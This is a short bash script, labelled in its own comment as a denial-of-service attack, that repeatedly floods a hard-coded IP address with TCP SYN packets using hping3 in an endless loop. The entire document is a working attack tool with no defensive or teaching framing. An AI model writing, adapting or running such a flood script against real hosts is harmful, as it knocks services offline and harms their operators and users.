#!/bin/bash

# DoS attack using hping3 
TARGET=123.100.20.1

while :; 
    sudo hping3 -S --flood -V -c 5000 -p 5005 $TARGET 
do sleep 20 ; done